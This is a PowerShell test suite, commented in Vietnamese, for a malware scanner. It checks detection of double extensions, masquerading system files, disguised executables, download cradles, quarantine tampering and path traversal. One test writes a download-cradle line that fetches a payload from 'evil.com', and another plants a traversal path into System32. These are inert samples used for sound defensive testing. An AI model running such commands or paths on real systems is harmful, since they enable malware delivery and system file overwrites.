# ============================================================================
# SCOM CYBERSHIELD v3.1 - COMPREHENSIVE SECURITY & INTEGRITY TEST SUITE
# ============================================================================
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$TestDir = Join-Path $env:TEMP "SCOM_SecTest_$(Get-Random)"
$TestQuarantine = Join-Path $TestDir "Quarantine"
New-Item -ItemType Directory -Path $TestDir -Force | Out-Null
New-Item -ItemType Directory -Path $TestQuarantine -Force | Out-Null

$EngineScript = Join-Path $PSScriptRoot "..\engine\core_scanner.ps1"
$CleanerScript = Join-Path $PSScriptRoot "..\engine\cleaner.ps1"
$passedCount = 0
$totalTests = 0

function Assert-Test {
    param([string]$Name, [bool]$Condition, [string]$Details = "")
    $script:totalTests++
    if ($Condition) {
        $script:passedCount++
        Write-Host " [PASS] $Name" -ForegroundColor Green
    } else {
        Write-Host " [FAIL] $Name : $Details" -ForegroundColor Red
    }
}

Write-Host "Bắt đầu kiểm thử bảo mật & toàn vẹn SCOM CyberShield v3.1..." -ForegroundColor Cyan
Write-Host "Thư mục test tạm: $TestDir`n" -ForegroundColor Gray

try {
    # TEST 1: Double Extension Detection
    $testFile1 = Join-Path $TestDir "contract.pdf.exe"
    Set-Content -Path $testFile1 -Value "Fake executable payload"
    $res1 = & $EngineScript -Mode "Custom" -TargetPath $testFile1 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Đuôi kép (Double Extension)" -Condition ($res1.ThreatsCount -ge 1 -and $res1.Threats[0].Reason -like "*DoubleExtension*")

    # TEST 2: Masquerade Fake System Process (svchost.exe outside System32)
    $testFile2 = Join-Path $TestDir "svchost.exe"
    Set-Content -Path $testFile2 -Value "Fake svchost"
    $res2 = & $EngineScript -Mode "Custom" -TargetPath $testFile2 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Mạo danh Tiến trình Hệ thống (Masquerading)" -Condition ($res2.ThreatsCount -ge 1 -and $res2.Threats[0].Reason -like "*FakeSystemFile*")

    # TEST 3: MZ Header Inspection & Stream Lock Disposal (PS-BUG-01)
    $testFile3 = Join-Path $TestDir "picture.jpg"
    $bytes = [byte[]]@(0x4D, 0x5A, 0x90, 0x00, 0x03)
    [System.IO.File]::WriteAllBytes($testFile3, $bytes)
    $res3 = & $EngineScript -Mode "Custom" -TargetPath $testFile3 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện MZ Header trong tệp ảnh (.jpg)" -Condition ($res3.ThreatsCount -ge 1 -and $res3.Threats[0].Reason -like "*DisguisedAsDocument*")

    $fileLockReleased = $false
    try {
        [System.IO.File]::WriteAllBytes($testFile3, @(0x00, 0x01))
        $fileLockReleased = $true
    } catch {}
    Assert-Test -Name "Giải phóng khóa luồng file an toàn sau khi quét (PS-BUG-01)" -Condition ($fileLockReleased -eq $true)

    # TEST 4: Modern Script Cradles (IEX, DownloadCradle, Base64)
    $testFile4 = Join-Path $TestDir "downloader.ps1"
    Set-Content -Path $testFile4 -Value "powershell.exe -enc AAAA downloadstring('http://evil.com/payload.exe')"
    $res4 = & $EngineScript -Mode "Custom" -TargetPath $testFile4 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Phát hiện Kịch bản tải mã độc (Download Cradle)" -Condition ($res4.ThreatsCount -ge 1 -and $res4.Threats[0].Reason -like "*PowerShellDownloadCradle*")

    # TEST 5: Auto-Quarantine & Safe Restore Flow
    $testFile5 = Join-Path $TestDir "invoice.pdf.exe"
    Set-Content -Path $testFile5 -Value "Threat to quarantine"
    $res5 = & $EngineScript -Mode "Custom" -TargetPath $testFile5 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive -AutoQuarantine | ConvertFrom-Json
    $isMoved = (-not (Test-Path $testFile5))
    $quarantineId = $res5.QuarantineResults[0].QuarantineId
    Assert-Test -Name "Tự động cách ly tệp độc hại an toàn" -Condition ($isMoved -and $quarantineId)

    $resRestore = & $EngineScript -Mode "QuarantineRestore" -RestoreId $quarantineId -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    $isRestored = (Test-Path $testFile5)
    Assert-Test -Name "Khôi phục tệp từ Khu cách ly về vị trí gốc nguyên vẹn" -Condition ($isRestored -and $resRestore.Status -eq "Success")

    # TEST 6: BẢO VỆ TOÀN VẸN KHU CÁCH LY (Từ chối khôi phục nếu file bị sửa đổi trái phép trên đĩa)
    $testFile6 = Join-Path $TestDir "tamper_test.pdf.exe"
    Set-Content -Path $testFile6 -Value "Original Content 12345"
    $res6 = & $EngineScript -Mode "Custom" -TargetPath $testFile6 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive -AutoQuarantine | ConvertFrom-Json
    $qId6 = $res6.QuarantineResults[0].QuarantineId
    
    # Giả lập kẻ tấn công can thiệp sửa nội dung file .quarantined trên đĩa
    $manifestPath = Join-Path $TestQuarantine "quarantine_manifest.json"
    $manifest = Get-Content -Path $manifestPath -Raw | ConvertFrom-Json
    $targetEntry = $manifest | Where-Object { $_.Id -eq $qId6 }
    $diskQFile = Join-Path $TestQuarantine $targetEntry.QuarantinedFile
    
    # Bỏ cờ ReadOnly và ghi đè nội dung giả
    (Get-Item $diskQFile).IsReadOnly = $false
    [System.IO.File]::WriteAllText($diskQFile, "MODIFIED_TAMPERED_EVIL_PAYLOAD")
    
    $resTamperRestore = & $EngineScript -Mode "QuarantineRestore" -RestoreId $qId6 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Cứng hóa Khu cách ly: Chặn khôi phục khi tệp bị can thiệp mã băm (Integrity Check)" -Condition ($resTamperRestore.Status -eq "IntegrityViolation")

    # TEST 7: CHỐNG PATH TRAVERSAL TRONG KHÔI PHỤC CÁCH LY
    $manifest = Get-Content -Path $manifestPath -Raw | ConvertFrom-Json
    foreach ($m in $manifest) {
        if ($m.Id -eq $qId6) {
            $m.OriginalPath = "..\..\Windows\System32\evil.dll"
        }
    }
    $manifest | ConvertTo-Json -Depth 5 | Set-Content -Path $manifestPath -Encoding UTF8
    $resTraversal = & $EngineScript -Mode "QuarantineRestore" -RestoreId $qId6 -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "Chặn lỗ hổng Path Traversal (..) khi khôi phục từ Manifest" -Condition ($resTraversal.Status -eq "Error")

    # TEST 8: KIỂM SOÁT TÀI NGUYÊN & LOẠI TRỪ THƯ MỤC NGUY HIỂM (.git, node_modules)
    $nestedGitDir = Join-Path $TestDir ".git\sub"
    New-Item -ItemType Directory -Path $nestedGitDir -Force | Out-Null
    Set-Content -Path (Join-Path $nestedGitDir "git_fake.pdf.exe") -Value "Should be skipped"
    
    $nestedNodeDir = Join-Path $TestDir "node_modules\pkg"
    New-Item -ItemType Directory -Path $nestedNodeDir -Force | Out-Null
    Set-Content -Path (Join-Path $nestedNodeDir "node_fake.pdf.exe") -Value "Should be skipped"

    $resBounded = & $EngineScript -Mode "Custom" -TargetPath $TestDir -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    $foundInExcluded = $false
    foreach ($th in $resBounded.Threats) {
        if ($th.Path.Contains(".git") -or $th.Path.Contains("node_modules")) {
            $foundInExcluded = $true
        }
    }
    Assert-Test -Name "Kiểm soát tài nguyên: Tự động loại trừ thư mục nặng (.git, node_modules)" -Condition ($foundInExcluded -eq $false)

    # TEST 9: CƠ CHẾ HỦY HỢP TÁC (Cooperative Cancellation Token)
    $cancelFlag = Join-Path $env:TEMP "scom_cancel_scan.flag"
    Set-Content -Path $cancelFlag -Value "CANCEL"
    $resCancel = & $EngineScript -Mode "Custom" -TargetPath $TestDir -QuarantineDir $TestQuarantine -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Remove-Item -Path $cancelFlag -Force -ErrorAction SilentlyContinue
    Assert-Test -Name "Cơ chế Hủy Hợp tác (Cooperative Cancellation Flag)" -Condition ($resCancel.Status -eq "Cancelled")

    # TEST 10: ProcessHunter An toàn với Tiến trình Cốt lõi Windows
    $procRes = & $EngineScript -Mode "ProcessHunter" -OutputFormat "JSON" -NonInteractive | ConvertFrom-Json
    Assert-Test -Name "ProcessHunter: Trả dữ liệu hợp lệ và bảo vệ tiến trình hệ thống" -Condition ($procRes.TotalProcesses -gt 0)

} finally {
    Remove-Item -Recurse -Force -Path $TestDir -ErrorAction SilentlyContinue
}

Write-Host "`n================================================================================" -ForegroundColor DarkGray
Write-Host "KẾT QUẢ KIỂM THỬ: $passedCount / $totalTests BÀI KIỂM TRA ĐẠT TRẠNG THÁI PASS!" -ForegroundColor $(if ($passedCount -eq $totalTests) { 'Green' } else { 'Red' })
Write-Host "================================================================================" -ForegroundColor DarkGray

if ($passedCount -ne $totalTests) {
    exit 1
} else {
    exit 0
}
